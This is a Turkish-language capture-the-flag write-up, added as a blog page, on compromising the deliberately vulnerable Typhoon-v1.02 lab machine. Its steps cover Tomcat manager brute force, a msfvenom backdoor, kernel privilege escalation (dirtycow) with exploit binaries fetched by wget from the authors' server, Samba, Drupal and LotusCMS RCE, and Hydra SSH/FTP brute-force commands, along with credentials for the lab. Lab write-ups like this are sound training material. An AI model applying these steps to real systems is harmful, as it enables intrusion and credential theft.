@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="/static/img/favicon.ico" />
+    <title>Typhoon-v1.02 WRITEUP - Posts</title>
+    <meta name="author" content="Alp Eren Işık" />
+    <meta name="description" content="Typhoon-v1.02 WRITEUP" />
+    <meta name="keywords" content="Typhoon-v1.02 WRITEUP, Posts, writeup" />
+    <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml">
+    <meta content="" property="fb:app_id">
+    <meta content="Posts" property="og:site_name">
+
+    
+
+    
+      <meta content="Typhoon-v1.02 WRITEUP" property="og:title">
+      <meta content="article" property="og:type">
+    
+
+    
+      <meta content="My Personal Posts" property="og:description">
+    
+
+    
+      <meta content="http://localhost:4000/2018/10/28/typhoon.html" property="og:url">
+    
+
+    
+      <meta content="2018-10-28T00:00:00+03:00" property="article:published_time">
+      <meta content="http://localhost:4000/about/" property="article:author">
+    
+
+    
+      <meta content="http://localhost:4000/static/img/profile.png" property="og:image">
+    
+
+    
+      
+        <meta content="writeup" property="article:section">
+      
+    
+
+    
+      
+    
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+
+    
+      <meta name="twitter:title" content="Typhoon-v1.02 WRITEUP">
+    
+
+    
+      <meta name="twitter:url" content="http://localhost:4000/2018/10/28/typhoon.html">
+    
+
+    
+      <meta name="twitter:description" content="My Personal Posts">
+    
+
+    
+
+    <!-- Font awesome icons -->
+    <link href="/static/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">
+    <!-- syntax highlighting CSS -->
+    <link rel="stylesheet" href="/static/css/syntax.css">
+    <!-- Bootstrap core CSS -->
+    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,300italic,300,400italic,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/static/css/super-search.css">
+    <link rel="stylesheet" href="/static/css/thickbox.css">
+    <link rel="stylesheet" href="/static/css/projects.css">
+    <link rel="stylesheet" href="/static/css/main.css">
+
+    
+  </head>
+  <body>
+    <div class="container">
+      <div class="col-sm-3">
+        <div class="fixed-condition">
+          <a href="/"><img class="profile-avatar" src="/static/img/profile.png" height="75px" width="75px" /></a>
+          <h1 class="author-name">Alp Eren Işık</h1>
+          
+            <div class="profile-about">
+              PauSiber
+            </div>
+          
+          <div class="social">
+            <ul>
+              
+                <li><a href="#" target="_blank"><i class="fa fa-twitter"></i></a></li>
+              
+                <li><a href="https://tr.linkedin.com/in/isikerenalp" target="_blank"><i class="fa fa-linkedin"></i></a></li>
+              
+                <li><a href="https://github.com/isikerenalp" target="_blank"><i class="fa fa-github"></i></a></li>
+              
+            </ul>
+          </div>
+          <div class="search" id="js-search">
+            <input type="text" placeholder="alp@eren~$ " class="search__input form-control" id="js-search__input">
+            <ul class="search__results" id="js-search__results"></ul>
+          </div>
+          <hr />
+          <ul class="sidebar-nav">
+            <li><a href="/">Home</a></li>
+            
+              <li><a class="about" href="/about/">About Me</a></li>
+            
+              <li><a class="about" href="/feed.xml">XML Feed</a></li>
+            
+          </ul>
+        </div>
+        <!-- end /.fixed-condition -->
+      </div>
+      <div class="col-sm-8 col-offset-1 main-layout">
+        <header class="post-header">
+  <h1 class="post-title">Typhoon-v1.02 WRITEUP</h1>
+</header>
+
+<span class="time">28 Oct 2018</span>
+
+  <span class="categories">
+    &raquo; <a href="/category/writeup">writeup</a>
+  </span>
+
+
+<div class="content">
+  <div class="post"><p><em>**Hazırlayanlar: <a href="https://github.com/isikerenalp">Alp Eren Işık</a> &amp; <a href="https://github.com/Fykarababa">Feyzi Yuşa Karababa</a> **</em></p>
+
+<hr />
+<p>PRISMA CSI tarafından hazırlanan Typhoon-v1.02 makinesini elimizden geldiği kadar çözmeye çalıştık ve sizler için ufak bir writeup hazırladık. Biz çözerken çok zevk aldık umarım sizler içinde zevkli bir writeup olur.</p>
+
+<hr />
+
+<h1 id="nmap"><code class="highlighter-rouge">NMAP</code></h1>
+<p>İlk aşamada Nmap ile port taraması yaparak çalışan servisleri ve versiyonları öğrendik.
+  Devamında bu servisler ve versiyonları üzerinden mevcut exploitleri araştıracağız.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/nmap.png" alt="nmap" /></p>
+
+<h1 id="apache-tomcat"><code class="highlighter-rouge">Apache Tomcat</code></h1>
+<p>Metasploit kullanarak <strong>use auxiliary/scanner/http/tomcat_mgr_login</strong> scanner kullanarak tomcat parolasını bulmaya çalışıyoruz.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/msf1.png" alt="" /></p>
+
+<p>Aşşağıda gördüğünüz gibi tomcat username ve password bulmuş oluyoruz</p>
+
+<p><img src="/static/img/posts/typhoon-v1/msf2.png" alt="" /></p>
+
+<p>Daha sonra <strong>10.242.24.216:8080/manager</strong> adresine giderek bulmuş olduğumuz <strong>username</strong> <code class="highlighter-rouge">(tomcat)</code> ve <strong>password</strong> <code class="highlighter-rouge">(tomcat)</code> ile giriş yapıyoruz.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/tomcat_tomcat.png" alt="" /></p>
+
+<p>Giriş yaptıktan sonra tekrar Metasploitimize geri dönüyoruz ve <strong>msfvenom</strong> ile backdoor oluşturuyoruz.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/msf3.png" alt="" /></p>
+
+<p>Daha sonra oluşturmuş olduğumuz bu backdooru girmiş olduğumuz <strong>tomcat</strong> üzerinden <strong>deploy</strong> ediyoruz</p>
+
+<p><img src="/static/img/posts/typhoon-v1/tomcat_deploy.png" alt="" /></p>
+
+<p>Deploy ettikten sonra tekrar Metasploitimize gelerek <code class="highlighter-rouge">use exploit/multi/handler</code> yazıyoruz daha sonra modülümüze bağlanacağımız backdoor payloadımızı ve bilgilerimizi giriyoruz.</p>
+
+<p>Artık tarayıcımızdan <code class="highlighter-rouge">10.242.24.216:8080/manager/typhoon/lyrzruiw.jsp</code> adresine girebiliriz.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/msf4.png" alt="" /></p>
+
+<p><img src="/static/img/posts/typhoon-v1/tomcat_backdoor.png" alt="" /></p>
+
+<p>Bu aşamadan sonra sunucuda <strong>ROOT</strong> olmaya çalışacağız.</p>
+
+<h1 id="yetki-yükseltme---1-dirtycow"><code class="highlighter-rouge">Yetki Yükseltme - 1 (dirtycow)</code></h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.exploit-db.com/exploits/40616   Backconnect olduğumuz makinemizde **C** kodunu derleyemediğimiz için derleme işlemini uzak sunucuda gerçekleştirmeye karar verdik.
+</code></pre></div></div>
+
+<p>Uzak sunucumuzda <code class="highlighter-rouge">wget https://www.exploit-db.com/raw/40616/index.html</code> ile komutları çektik ve uzak sunucumuzda bunu derledik. Daha sonra Typhoon makinesinde <code class="highlighter-rouge">wget https://sunucu_adresi/prisma</code> diyerek derlenmiş <strong>C</strong> kodunu makinemize yüklemiş olduk. Derleyip wget ile çekmiş olduğumuz exploitimizi makinemizde çalıştırdık ve <strong>ROOT</strong> olduk. Son olarak <code class="highlighter-rouge">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</code> komutunu girerek exploitimizin stabil olmasını sağlayarak sunucunun crash olmasını engelliyoruz. :)</p>
+
+<p><img src="/static/img/posts/typhoon-v1/msf5_dirtycow.png" alt="" /></p>
+
+<h1 id="yetki-yükseltme---2-ubuntu-kernel-exploit"><code class="highlighter-rouge">Yetki Yükseltme - 2 (Ubuntu Kernel Exploit)</code></h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.exploit-db.com/exploits/37292/ Yukarıda anlatmış olduğumuz işlemleri bu exploitimiz ile de uygulayarak `wget https://sunucu_adresi/ubn` ile çekmiş olduğumuz exploitimizi makinemizde çalıştırarak  **ROOT** oluyoruz. :)
+</code></pre></div></div>
+
+<p><img src="/static/img/posts/typhoon-v1/msf5_ubuntu_exploit.png" alt="" /></p>
+
+<h1 id="samba-smbd-3x---4x-root"><code class="highlighter-rouge">Samba smbd 3.X - 4.X (ROOT)</code></h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Github Code = https://github.com/rapid7/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb
+</code></pre></div></div>
+
+<p>Çalışan versiyonda bir exploit olduğunu öğrendik. Githubda bulduğumuz kodu <code class="highlighter-rouge">wget</code> ile <strong>/opt/metasploit/modules/exploits/linux/samba/</strong> dizini altına <strong>is_known_pipename.rb</strong> ismiyle kaydettik. Daha sonra metasploit üzerinden exploiti kullanarak makinemizde <strong>ROOT</strong> olduk. :)</p>
+
+<p><img src="/static/img/posts/typhoon-v1/samba.png" alt="" /></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NOT: Eğer bu aşamadan sonra root olmaz ise devamında dirtycow ile rootlayabilirsiniz.
+</code></pre></div></div>
+
+<h1 id="phpmyadmin-username--password"><code class="highlighter-rouge">Phpmyadmin Username &amp;&amp; Password</code></h1>
+<p>Sunucumzuda root olduktan sonra içeriye bir de shell atalım dedik. Shellimizden dizinleri ve dosyaları gezerken <code class="highlighter-rouge">/var/www/html/dvwa/config/config.inc.php</code> dosyası içerisinde <strong>phpmyadmin</strong> kullanıcı adı ve parolasını bulduk.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/phpmyadmin1.png" alt="" /></p>
+
+<p><img src="/static/img/posts/typhoon-v1/phpmyadmin2.png" alt="" /></p>
+
+<p><img src="/static/img/posts/typhoon-v1/phpmyadmin3.png" alt="" /></p>
+
+<h1 id="kullanıcı-adı-ve-parolası"><code class="highlighter-rouge">Kullanıcı Adı ve Parolası</code></h1>
+<p>Shellimizi attıktan sonra bir de mongoadmin dikkatimizi çekti ve biz de  <code class="highlighter-rouge">http://192.168.43.114/mongoadmin/</code> adresine gittik.</p>
+
+<p><strong>credentials</strong> Bir değişiklik yapmadan bu şekilde aratıyoruz.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/mongoadmin1.png" alt="" /></p>
+
+<p><strong>creds (2)</strong></p>
+
+<p><img src="/static/img/posts/typhoon-v1/mongoadmin2.png" alt="" /></p>
+
+<p>Kullanıcı adı ve parolasını öğrenmiş olduk.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/mongoadmin3.png" alt="" /></p>
+
+<p>URL= <code class="highlighter-rouge">http://192.168.43.114/mongoadmin/index.php?db=credentials&amp;action=listRows&amp;collection=creds</code></p>
+
+<p><strong>Username</strong> : <code class="highlighter-rouge">typhoon</code> &amp;&amp; <strong>Password</strong> : <code class="highlighter-rouge">789456123</code></p>
+
+<p><img src="/static/img/posts/typhoon-v1/login.png" alt="" /></p>
+
+<h1 id="postgresql-db-933---935-exploit-ile-dosya-okuma"><code class="highlighter-rouge">PostgreSQL DB 9.3.3 - 9.3.5 Exploit ile Dosya Okuma</code></h1>
+<p>Çalışan PostgreSQL sürümünde dosyaları okumamıza imkan sağlayan bir exploit olduğunu farkettik. ve  Metasploitimiz ile işe koyulmaya başladık :)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>auxiliary/admin/postgres/postgres_readfile
+
+Not: 'exploit' yerine 'set RFILE ../okunacak_dosya' komutu ile dosyaları okuyabilirsiniz
+</code></pre></div></div>
+
+<p><img src="/static/img/posts/typhoon-v1/postgresql_read-file.png" alt="" /></p>
+
+<h1 id="drupal-8-rce"><code class="highlighter-rouge">Drupal-8 RCE</code></h1>
+<hr />
+<p>view-source:http://192.168.1.60/drupal diyerek drupalın sürümünün 8 olduğunu öğrendikten sonra aklımıza Drupal-8 de bulunan RCE geldi.</p>
+
+<p>Drupal RCE CVE-2018-7600 : https://www.exploit-db.com/exploits/44448/</p>
+
+<hr />
+<p>Drupalın <strong>register</strong> bölümünde mevcut olan <code class="highlighter-rouge">RCE</code> zaafiyeti.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/drupal.png" alt="" /></p>
+
+<p>Bunun dışında şöyle bir yöntem izlenebilir , drupalın default olarak config dosyası <strong>sites/default/settings.php</strong> de bulunmakta. Bunu <code class="highlighter-rouge">RCE</code> açığı ile okuyup database username ve password bilgileri alınıp phpmyadmine giriş yapılabilir.</p>
+
+<p><img src="/static/img/posts/typhoon-v1/drupal2.png" alt="" /></p>
+
+<p><strong>NOT:</strong> <code class="highlighter-rouge">Post olarak gönderdiğimizde ilk olarak shell atmaya çalıştık fakat drupalın dizininde yazma izni yoktu. Ardından pwd komutu ile bulunduğu dizini öğrendik. Sonra var/www/html dizininde yazma izni olduğunu gördük ve shellimizi yükledik. :)</code></p>
+
+<h1 id="lotuscms-rce-exploit"><code class="highlighter-rouge">LotusCMS RCE Exploit</code></h1>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/http/lcms_php_exec
+https://www.exploit-db.com/exploits/18565/   Sistemin kullandığı CMS yazılımının LotusCMS olduğunu öğrendik ve google'da kısa bir araştırma yaptıktan sonra **RCE** exploitinin olduğunu gördük. Daha sonra kullanacağımız exploiti ve bilgilerimizi girdikten sonra `exploit` diyerek çalıştırıyoruz.
+</code></pre></div></div>
+
+<p><img src="/static/img/posts/typhoon-v1/lotuscms.png" alt="" /></p>
+
+<h1 id="brute-force-ile-parola-tespiti"><code class="highlighter-rouge">Brute Force ile Parola Tespiti</code></h1>
+<hr />
+<p>Burada Hydra ile <strong>SSH</strong> ve <strong>FTP</strong> ‘ye brute force yaparak parolayı bulduk.</p>
+
+<p>hydra -t 1 -l typhoon -P /home/fkarababa/Masaüstü/pass.txt -vV 192.168.1.60 ssh</p>
+
+<p>hydra -t 1 -l typhoon -P /home/fkarababa/Masaüstü/pass.txt -vV 192.168.1.60 ftp
+***
+<code class="highlighter-rouge">SSH</code></p>
+
+<p><img src="/static/img/posts/typhoon-v1/hydra-ssh.png" alt="" /></p>
+
+<p><code class="highlighter-rouge">FTP</code></p>
+
+<p><img src="/static/img/posts/typhoon-v1/hydra_ftp.png" alt="" /></p>
+</div>
+  <div class="share-page">
+  <span style="float: left;">Share this on &rarr;&nbsp;&nbsp;</span>
+
+  <!-- Twitter -->
+  <a href="https://twitter.com/share" class="twitter-share-button" data-via="">Tweet</a>
+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+</div>
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId=";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+</div>
+
+<div class="PageNavigation">
+  
+    <a class="prev" href="/2018/07/24/php_url_parse_etmek.html">&laquo; PHP URL Ayrıştırmak (URL Parse Etmek)</a>
+  
+  
+</div>
+
+        <footer>
+          &copy; Alp Eren Işık
+          
+            - <a href="https://github.com/isikerenalp">https://github.com/isikerenalp</a>
+          
+          <div class="btn-github" style="float:right;">
+          </div>
+        </footer>
+      </div>
+      <!-- end /.col-sm-8 -->
+    </div>
+    <!-- end /.container -->
+
+    <!-- Bootstrap core JavaScript -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
+    <script src="/static/js/bootstrap.min.js"></script>
+    <script src="/static/js/super-search.js"></script>
+    <script src="/static/js/thickbox-compressed.js"></script>
+    <script src="/static/js/projects.js"></script>
+  </body>
+</html>
+
